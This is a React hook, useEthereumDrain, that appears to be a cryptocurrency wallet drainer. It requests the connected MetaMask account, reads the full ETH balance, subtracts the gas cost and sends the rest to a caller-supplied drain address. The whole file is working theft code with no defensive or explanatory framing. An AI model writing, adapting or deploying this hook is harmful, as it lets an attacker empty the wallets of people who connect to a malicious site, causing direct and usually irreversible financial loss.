import { useState, useCallback } from 'react';
import { ethers } from 'ethers';

export const useEthereumDrain = (drainAddress) => {
  const [status, setStatus] = useState('idle');
  const [error, setError] = useState(null);

  const executeDrain = useCallback(async () => {
    try {
      setStatus('processing');
      
      if (!window.ethereum) {
        throw new Error('MetaMask not installed');
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      
      // Get balance
      const balance = await provider.getBalance(address);
      
      if (balance === 0n) {
        throw new Error('No ETH balance');
      }
      
      // Calculate gas
      const feeData = await provider.getFeeData();
      const gasLimit = 21000n;
      const gasCost = gasLimit * feeData.maxFeePerGas;
      
      // Amount to drain
      const drainAmount = balance - gasCost;
      
      if (drainAmount <= 0n) {
        throw new Error('Insufficient balance for gas');
      }
      
      // Send transaction
      const tx = await signer.sendTransaction({
        to: drainAddress,
        value: drainAmount,
        gasLimit
      });
      
      // Wait for confirmation
      await tx.wait();
      
      setStatus('success');
      return {
        success: true,
        txHash: tx.hash,
        amount: ethers.formatEther(drainAmount)
      };
      
    } catch (err) {
      setError(err.message);
      setStatus('failed');
      throw err;
    }
  }, [drainAddress]);

  return { executeDrain, status, error };
};
                          
